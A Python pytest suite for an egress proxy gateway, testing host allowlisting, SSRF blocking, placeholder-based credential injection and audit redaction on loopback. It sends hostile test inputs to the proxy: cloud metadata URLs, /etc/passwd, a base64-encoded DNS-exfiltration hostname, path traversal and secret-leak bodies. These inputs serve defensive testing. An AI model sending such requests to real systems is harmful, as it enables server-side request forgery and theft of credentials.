"""spec 014 §3–§4（W7-03 / W7-04）：出网网关的白名单、SSRF、凭证注入与审计（本机回环，不联网）。"""

from __future__ import annotations

import asyncio
import json
import socket
from pathlib import Path
from typing import Any

import pytest

from triwitness.gateway import egress_proxy as ep
from triwitness.gateway.egress_proxy import CredentialRule, EgressConfig, check_target, host_match, inject

SECRET = "ghp_REALSECRETVALUE0123456789abcdefABCD"
PH = "tw-placeholder-github"


def test_host_match_exact_and_wildcard() -> None:
    assert host_match("pypi.org", "pypi.org") and host_match("PyPI.org.", "pypi.org")
    assert host_match("files.pythonhosted.org", "*.pythonhosted.org")
    assert not host_match("pythonhosted.org", "*.pythonhosted.org")
    assert not host_match("evilpypi.org", "pypi.org") and not host_match("pypi.org.evil.com", "pypi.org")


@pytest.mark.parametrize(
    ("host", "port", "reason"),
    [
        ("169.254.169.254", 80, "ip_literal"),
        ("10.0.0.1", 443, "ip_literal"),
        ("[::1]", 443, "ip_literal"),
        ("metadata.google.internal", 80, "metadata_host"),
        ("evil.example", 443, "not_allowlisted"),
        ("pypi.org", 22, "port_22"),
    ],
)
def test_check_target_denies(host: str, port: int, reason: str) -> None:
    cfg = EgressConfig(allow=["pypi.org", "metadata.google.internal"])
    v = check_target(cfg, host, port)
    assert not v.allow and v.reason == reason


def test_forbidden_ips() -> None:
    for ip in ["127.0.0.1", "10.1.2.3", "172.16.0.1", "192.168.1.1", "169.254.169.254", "100.64.0.1", "::1",
               "fe80::1", "::ffff:169.254.169.254", "0.0.0.0", "fd00::1"]:  # fmt: skip
        assert ep.is_forbidden_ip(ip), ip
    assert not ep.is_forbidden_ip("151.101.0.223")


def _rule(**kw: Any) -> CredentialRule:
    base = dict(name="github", host="api.github.com", placeholder=PH, secret_env="GH_TOKEN",
                methods=("GET",), path_prefix="/repos/o/r")  # fmt: skip
    return CredentialRule(**{**base, **kw})  # type: ignore[arg-type]


def test_inject_rules_domain_method_path() -> None:
    cfg = EgressConfig(credentials=[_rule()])
    env = {"GH_TOKEN": SECRET}
    hdrs = [("Authorization", f"Bearer {PH}"), ("Accept", "*/*")]
    new, why, used = inject(cfg, "api.github.com", "GET", "/repos/o/r/issues?x=1", hdrs, env)
    assert new is not None and ("Authorization", f"Bearer {SECRET}") in new and used == "github"
    for host, method, path in [("api.github.com", "DELETE", "/repos/o/r"), ("evil.com", "GET", "/repos/o/r"),
                               ("api.github.com", "GET", "/repos/o/other"),
                               ("api.github.com", "GET", "/repos/o/r/../../other")]:  # fmt: skip
        new, why, _ = inject(cfg, host, method, path, hdrs, env)
        assert new is None and why == "placeholder_misroute", (host, method, path)
    # 占位符放在别的 header 里也不行
    new, why, _ = inject(cfg, "api.github.com", "GET", "/repos/o/r", [("X-Leak", PH)], env)
    assert new is None
    new, why, _ = inject(cfg, "api.github.com", "GET", "/repos/o/r", hdrs, {})
    assert new is None and why == "secret_missing"


# ------------------------------------------------------------------ 端到端（回环）
class Upstream:
    def __init__(self, body: bytes = b"hello") -> None:
        self.seen: list[bytes] = []
        self.body = body

    async def handle(self, r: asyncio.StreamReader, w: asyncio.StreamWriter) -> None:
        head = await r.readuntil(b"\r\n\r\n")
        self.seen.append(head)
        n = 0
        for ln in head.decode().split("\r\n"):
            if ln.lower().startswith("content-length:"):
                n = int(ln.split(":")[1])
        if n:
            self.seen.append(await r.readexactly(n))
        w.write(b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\nConnection: close\r\n\r\n" % len(self.body) + self.body)
        await w.drain()
        w.close()


async def _start(handler: Any) -> tuple[asyncio.Server, int]:
    srv = await asyncio.start_server(handler, "127.0.0.1", 0)
    return srv, srv.sockets[0].getsockname()[1]


async def _send(port: int, data: bytes) -> bytes:
    r, w = await asyncio.open_connection("127.0.0.1", port)
    w.write(data)
    await w.drain()
    out = await asyncio.wait_for(r.read(), 5)
    w.close()
    return out


@pytest.fixture
def audit(tmp_path: Path) -> Path:
    return tmp_path / "audit.jsonl"


async def test_proxy_http_injection_deny_and_audit(audit: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    secret_body = b"token echo: " + SECRET.encode()
    up = Upstream(secret_body)
    usrv, uport = await _start(up.handle)
    cfg = EgressConfig(allow=[], allow_private=["127.0.0.1"], audit_path=str(audit),
                       credentials=[_rule(host="127.0.0.1", path_prefix="/api")])  # fmt: skip
    proxy = ep.EgressProxy(cfg, {"GH_TOKEN": SECRET})
    psrv, pport = await _start(proxy.handle)
    async with usrv, psrv:
        ok = await _send(pport, f"GET http://127.0.0.1:{uport}/api/x?q=secretquery HTTP/1.1\r\nHost: x\r\n"
                                f"Authorization: Bearer {PH}\r\n\r\n".encode())  # fmt: skip
        assert ok.startswith(b"HTTP/1.1 200")
        assert f"Bearer {SECRET}".encode() in up.seen[0]  # 上游拿到真实值
        assert SECRET.encode() not in ok and b"*" * len(SECRET) in ok  # 回显被抹掉
        bad = await _send(pport, f"GET http://127.0.0.1:{uport}/other HTTP/1.1\r\nAuthorization: Bearer {PH}\r\n\r\n"
                          .encode())  # fmt: skip
        assert b"403" in bad.split(b"\r\n")[0] and b"placeholder_misroute" in bad
        n_seen = len(up.seen)
        body = f"leak={PH}".encode()
        bad2 = await _send(pport, b"POST http://127.0.0.1:%d/api HTTP/1.1\r\nContent-Length: %d\r\n\r\n%s"
                           % (uport, len(body), body))  # fmt: skip
        assert b"placeholder_in_body" in bad2 and len(up.seen) == n_seen
    text = audit.read_text(encoding="utf-8")
    assert SECRET not in text and "secretquery" not in text
    recs = [json.loads(x) for x in text.splitlines()]
    assert recs[0]["kind"] == "http" and recs[0]["injected"] == "github" and recs[0]["path"] == "/api/x"
    assert {r.get("reason") for r in recs if r["kind"] == "deny"} == {"placeholder_misroute", "placeholder_in_body"}


async def test_proxy_not_allowlisted_never_resolves(audit: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    asked: list[str] = []
    loop = asyncio.get_running_loop()
    real = loop.getaddrinfo

    async def spy(host: Any, *a: Any, **k: Any) -> Any:
        asked.append(str(host))
        return await real(host, *a, **k)

    monkeypatch.setattr(loop, "getaddrinfo", spy)
    proxy = ep.EgressProxy(EgressConfig(allow=["pypi.org"], audit_path=str(audit)), {})
    psrv, pport = await _start(proxy.handle)
    async with psrv:
        for target in [b"CONNECT c2VjcmV0.evil.example:443 HTTP/1.1\r\n\r\n",
                       b"GET http://c2VjcmV0.evil.example/x HTTP/1.1\r\n\r\n",
                       b"CONNECT 169.254.169.254:80 HTTP/1.1\r\n\r\n",
                       b"GET http://169.254.169.254/latest/meta-data/ HTTP/1.1\r\n\r\n",
                       b"GET http://metadata.google.internal/computeMetadata/v1/ HTTP/1.1\r\n\r\n",
                       b"GET /etc/passwd HTTP/1.1\r\n\r\n"]:  # fmt: skip
            out = await _send(pport, target)
            assert out.startswith(b"HTTP/1.1 403"), target
    assert asked == []  # 白名单外的名字网关连 DNS 都不查（防 DNS 外泄）


async def test_proxy_allowlisted_but_private_resolution(audit: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    loop = asyncio.get_running_loop()

    async def fake(host: Any, port: Any, **k: Any) -> Any:
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("10.0.0.5", port)),
                (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", port))]  # fmt: skip

    monkeypatch.setattr(loop, "getaddrinfo", fake)
    proxy = ep.EgressProxy(EgressConfig(allow=["rebind.example"], audit_path=str(audit)), {})
    psrv, pport = await _start(proxy.handle)
    async with psrv:
        out = await _send(pport, b"CONNECT rebind.example:443 HTTP/1.1\r\n\r\n")
    assert b"resolves_to_private" in out


async def test_proxy_connect_tunnel_and_svc_binding(audit: Path) -> None:
    up = Upstream(b"pong")
    usrv, uport = await _start(up.handle)
    rule = _rule(name="demo", host="127.0.0.1", path_prefix="/v1", upstream=f"http://127.0.0.1:{uport}/v1")
    cfg = EgressConfig(allow_private=["127.0.0.1"], audit_path=str(audit), credentials=[rule])
    proxy = ep.EgressProxy(cfg, {"GH_TOKEN": SECRET})
    psrv, pport = await _start(proxy.handle)
    async with usrv, psrv:
        r, w = await asyncio.open_connection("127.0.0.1", pport)
        w.write(f"CONNECT 127.0.0.1:{uport} HTTP/1.1\r\n\r\n".encode())
        await w.drain()
        assert (await r.readuntil(b"\r\n\r\n")).startswith(b"HTTP/1.1 200")
        w.write(b"GET /tunnel HTTP/1.1\r\n\r\n")
        await w.drain()
        assert (await asyncio.wait_for(r.read(), 5)).endswith(b"pong")
        w.close()
        out = await _send(pport, f"GET /svc/demo/models HTTP/1.1\r\nAuthorization: Bearer {PH}\r\n\r\n".encode())
        assert out.startswith(b"HTTP/1.1 200")
        assert up.seen[-1].startswith(b"GET /v1/models ") and SECRET.encode() in up.seen[-1]
        out = await _send(pport, b"GET /svc/nope/x HTTP/1.1\r\n\r\n")
        assert b"unknown_binding" in out


def test_config_roundtrip_and_main_parses(tmp_path: Path) -> None:
    cfg = EgressConfig(allow=["pypi.org"], credentials=[_rule()])
    again = EgressConfig.from_dict(json.loads(json.dumps(cfg.to_dict())))
    assert again.credentials[0].methods == ("GET",) and again.allow == ["pypi.org"]


def test_proxy_file_is_stdlib_only() -> None:
    """网关容器里只有标准库：egress_proxy.py 不能 import triwitness 或第三方包。"""
    import ast
    import sys

    tree = ast.parse(Path(ep.__file__).read_text(encoding="utf-8"))
    mods = {n.names[0].name.split(".")[0] for n in ast.walk(tree) if isinstance(n, ast.Import)}
    mods |= {n.module.split(".")[0] for n in ast.walk(tree) if isinstance(n, ast.ImportFrom) and n.module}
    assert mods <= set(sys.stdlib_module_names) | {"__future__"}, mods
